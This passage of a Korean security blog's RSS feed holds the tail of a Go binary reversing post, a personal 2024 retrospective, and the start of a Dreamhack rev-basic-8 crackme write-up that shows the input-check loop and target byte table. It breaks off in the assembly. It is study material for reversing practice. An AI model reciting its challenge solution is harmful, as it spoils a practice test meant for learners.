 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F5A6&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;runtime_makeslice&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode&lt;/code&gt;는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int64&lt;/code&gt; 타입 param을 2개 받고, 스택 내부 공간 할당 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub rsp, 18h&lt;/code&gt;를 통해 18h만큼의 공간을 할당받음&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;문제의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_makeslice&lt;/code&gt; 함수가 실행 초반에 어떻게 파라미터를 처리하는지 확인하면 다음과 같음&lt;/p&gt;

    &lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAE0&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;r14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;10h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAE4&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;jbe&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;loc_46FB7F&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAEA&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAEB&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAEE&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAF2&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAF5&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAF8&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAFB&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_makeslice&lt;/code&gt; 함수는 스택 내부 공간 할당 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub rsp, 18h&lt;/code&gt;를 통해 18h만큼의 공간을 할당받으며, 이후 이어지는 스택 공간 관련 연산이 없음&lt;/li&gt;
      &lt;li&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_makelice&lt;/code&gt; 또한 int64 타입 param을 2개 받으리란 추측이 가능함&lt;/li&gt;
      &lt;li&gt;따라서 해당 함수 type declaration을 통해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__int64 __fastcall runtime_makeslice(__int64, __int64);&lt;/code&gt; 로 재선언 진행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;그 결과, 아래와 같이 함수 재조정이 올바르게 되어 디컴파일이 가능해짐&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2016.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:result_passing&quot;&gt;
      &lt;p&gt;Function calls pass arguments and results using a combination of the stack and machine registers. Each argument or result is passed either entirely in registers or entirely on the stack. Because access to registers is generally faster than access to the stack, arguments and results are preferentially passed in registers. However, any argument or result that contains a non-trivial array or does not fit entirely in the remaining available registers is passed on the stack. &lt;a href=&quot;#fnref:result_passing&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 24 Dec 2024 09:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-25-fsi-fiesta2024-S2-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-25-fsi-fiesta2024-S2-1</guid>
      </item>
    
      <item>
        <title>2024년 회고</title>
        <description>&lt;p&gt;블로그 포스트가 뜸했다&lt;/p&gt;

&lt;p&gt;사실 그게 말이지&lt;/p&gt;

&lt;p&gt;한 건 많거든요&lt;/p&gt;

&lt;p&gt;많은데&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;외부에 말할 수 없음&lt;/li&gt;
  &lt;li&gt;개인적으로 공부한 건 왜인진 모르겠지만 글을 쓰다가 안 썼음&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;근데 진짜 웃긴 건&lt;/p&gt;

&lt;p&gt;개인적으로 풀었으나 글을 쓰다가 만 건 또 찾아보면 다 풀어서 플래그까지 땄음&lt;/p&gt;

&lt;p&gt;그냥 귀찮아서 중간에 안 쓴 거임&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;금융보안원 SW공급망보안팀에 들어와서 정말 많은 걸 했고 배웠다&lt;/p&gt;

&lt;p&gt;그리고 정말 좋은 사람들을 많이 만났고&lt;/p&gt;

&lt;p&gt;내 롤모델로 삼은 사람도 만났다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;올해 업무적으로는 크게 4개 정도 한 것 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;금융권 SW공급망보안 자율점검 체크리스트 개발&lt;/li&gt;
  &lt;li&gt;금융권 버그바운티 운영(아 진짜 재밌었다. 취약점 재현도 마음껏 하고 궁금한 게 있으면 물어볼 사람도 있고)&lt;/li&gt;
  &lt;li&gt;금융권 CNA 운영&lt;/li&gt;
  &lt;li&gt;원내 해킹 동아리 구성 및 운영&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 천천히 포스트에 추가하는 걸로 하자… 물론 언제 추가할진 모름&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;개인적으로는&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;책장에 구겨놨던 책들을 천천히 읽고 있다&lt;/li&gt;
  &lt;li&gt;하고 싶었던 공부를 마음껏 하고 있다&lt;/li&gt;
  &lt;li&gt;대학원에 지원했다&lt;/li&gt;
  &lt;li&gt;업무를 효율적으로 한다는 것은 무엇인지에 관해 계속 고민 중이다&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;적독-해소-중&quot;&gt;적독 해소 중&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 책을 많이 읽긴 한다&lt;/p&gt;

&lt;p&gt;학부생 시절엔 한 학기 동안 책 400권씩 읽고 그랬다 물론 휴학했던 때긴 함&lt;/p&gt;

&lt;p&gt;근데 작년에 취준을 하는 바람에….!!!!!! 직전에 잔뜩 사 놨던 책을 전혀 읽지 못했다&lt;/p&gt;

&lt;p&gt;영혼을 위한 닭고기수프를 못 먹은 지 근 1 여 년…. 내 영혼은 그만 배고파 돌아버리고 만다&lt;/p&gt;

&lt;p&gt;사실 본전 생각나서 돌아버렸다&lt;/p&gt;

&lt;p&gt;책장에 지금 새로 사 놓고 못 읽은 게 얼마 어치인데&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아무튼 그래서 열심히 읽고 있다. 와 근데 과거의 나… 보는 눈 굉장하다….&lt;/p&gt;

&lt;p&gt;책 설명만 읽고 구매~~~ 했던 건데 하나같이 수작임&lt;/p&gt;

&lt;p&gt;내 돈 들여 산 건데 갑자기 행운아가 된 것 같은 기분…&lt;/p&gt;

&lt;p&gt;이런 사소한 것에서 행복을 찾는 게 인생을 행복하게 사는 방법 아니겠나요?&lt;/p&gt;

&lt;p&gt;궤변을 이토록 논리적으로 하다니 과연 다독가구나.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;하고-싶었던-공부-중&quot;&gt;하고 싶었던 공부 중&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 취준할 땐 논문을 읽으면서도 ‘이게… 취업에 도움이 될까…’ 이랬고&lt;/p&gt;

&lt;p&gt;해킹 문제를 풀면서도 ‘이게… 취업에 도움이 될까…’ 이랬음&lt;/p&gt;

&lt;p&gt;과연 이걸 해서 얻는 취업 관련 이득이 이걸로 인해 잃는 시간적 손실보다 큰가? 하면 당당히 YES라고 말할 수 없었음&lt;/p&gt;

&lt;p&gt;하지만 이제 취직했죠?&lt;/p&gt;

&lt;p&gt;내 실력이 얼마나 구리든 지금 이 논문이 어느 분야의 논문이든&lt;/p&gt;

&lt;p&gt;나에게는 주저하지 않을 자유가 주어졌음&lt;/p&gt;

&lt;p&gt;이게 얼마나 달콤한 맛인지 얻고 나니 알겠더라&lt;/p&gt;

&lt;p&gt;그래서 집에 가서 맨날 해킹 문제 풀고 프로그램 분석하고 심심하면 논문 뽑아 읽고 그랬음&lt;/p&gt;

&lt;p&gt;내가 초보라는 사실에 전혀 두려움을 느끼지 않았고 나에게 들어오는 정보 자체에 기뻐했음&lt;/p&gt;

&lt;p&gt;평생 이렇게 살고 싶다고 생각했음&lt;/p&gt;

&lt;p&gt;… 대학원을 지원하기 전까진 그랬음 (꼴랑 6개월 했단 뜻임)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;대학원-지원&quot;&gt;대학원 지원&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 왜 이 짓을 했을까?&lt;/p&gt;

&lt;p&gt;아니 지원한 것 자체는 후회가 없다&lt;/p&gt;

&lt;p&gt;사유: 나는 학부 시절부터 진학을 하고 싶었음. 그러나 넓은 세상을 보고 싶은 욕구가 더 컸기 때문에 취업을 택했음&lt;/p&gt;

&lt;p&gt;이제 정말 원한다면 할 수 있는 때가 됐음&lt;/p&gt;

&lt;p&gt;그래서 지원함!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;근데 지원한다고 끝나는 게 아니죠?&lt;/p&gt;

&lt;p&gt;나는 몰랐었다 대학원 지원하려면 연구계획서를 써야 한다는 사실을&lt;/p&gt;

&lt;p&gt;그리고 잊고 있었다 면접을 준비해야 한다는 사실을&lt;/p&gt;

&lt;p&gt;대학원 준비하면서 제일 많이 했던 말: 아니 난 취업을 했는데 왜 자소서랑 이력서를 다시 쓰고 있는 것 같지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;2군데 지원했는데 다 붙었음&lt;/p&gt;

&lt;p&gt;와진짜감사합니다&lt;/p&gt;

&lt;p&gt;이런저라도…받아주시겠어요? 막이래&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;업무-효율화&quot;&gt;업무 효율화&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 요즘 꽂힌 주제다.&lt;/p&gt;

&lt;p&gt;어떻게 해야 디테일을 더 안 놓칠 수 있을까&lt;/p&gt;

&lt;p&gt;어떻게 해야 내가 이 사업을 가장 잘 아는 사람이 될 수 있을까&lt;/p&gt;

&lt;p&gt;그리고 업무 관련 이슈트래킹은 어떤 식으로 해놔야 히스토리를 압축하여 기억해둘 수 있을까&lt;/p&gt;

&lt;p&gt;아 괴롭다&lt;/p&gt;

&lt;p&gt;근데 의미없는 괴로움은 아니라 기껍다&lt;/p&gt;

&lt;p&gt;아무튼 그렇다… 그렇게 살고 있다&lt;/p&gt;

&lt;p&gt;블로그 포스트 더 자주 쓸 수 있도록 노력해야지&lt;/p&gt;

</description>
        <pubDate>Sun, 01 Dec 2024 07:24:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/Diary/241201</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/Diary/241201</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-8 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-확인&quot; id=&quot;markdown-toc-0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-동적-분석&quot; id=&quot;markdown-toc-1-동적-분석&quot;&gt;1. 동적 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000&quot; id=&quot;markdown-toc-21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-2s-complement&quot; id=&quot;markdown-toc-22-2s-complement&quot;&gt;2.2. 2’s complement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-sub_140001000-내부-비교-루틴어셈블리&quot; id=&quot;markdown-toc-23-sub_140001000-내부-비교-루틴어셈블리&quot;&gt;2.3. sub_140001000 내부 비교 루틴(어셈블리)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-난관에-봉착하다&quot; id=&quot;markdown-toc-23-난관에-봉착하다&quot;&gt;2.3. 난관에 봉착하다&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#24-난관에서-빠져나왔다&quot; id=&quot;markdown-toc-24-난관에서-빠져나왔다&quot;&gt;2.4. 난관에서 빠져나왔다&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-질문&quot; id=&quot;markdown-toc-3-질문&quot;&gt;3. 질문.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PE64, C언어로 작성된 프로그램&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-동적-분석&quot;&gt;1. 동적 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Input 나오고, 사용자 입력 받고, Correct / Wrong 판별해 보여줌&lt;/p&gt;

&lt;p&gt;콘솔에서 stdin 받음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;역시나 똑같음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 sub_140001000을 들여다보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;안예뻐&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이젠예뻐&lt;/p&gt;

&lt;p&gt;byte_140003000 안에 담긴 데이터는 아래와 같음&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;궁금한 점. 왜 -5를 곱한 걸까? 이 문제의 의도가 뭘까?&lt;/p&gt;

&lt;p&gt;1byte 자료형이 마이너스를 표현하는 방법에 대해 알아보라는 뜻 아닐까?&lt;/p&gt;

&lt;p&gt;흠… 진짜 왜지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;22-2s-complement&quot;&gt;2.2. 2’s complement&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이진수의 모든 자리 숫자를 반전시키고, 1을 더해서 2의 보수를 구한다.&lt;/p&gt;

&lt;p&gt;2의 보수인 수는 원래 숫자의 음수로 취급된다.&lt;/p&gt;

&lt;p&gt;(자세한 건 생략)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;23-sub_140001000-내부-비교-루틴어셈블리&quot;&gt;2.3. sub_140001000 내부 비교 루틴(어셈블리)&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usr_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;뭔가 감이 안 오는 것 같으면 어셈을 한 번 보는 것도 좋으니, 어셈으로 위 비교문의 if 조건을 보자.&lt;/p&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;movsxd&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arg_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;movzx&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;imul&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;11111011b&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;and&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;11111111b&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;movsxd&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span 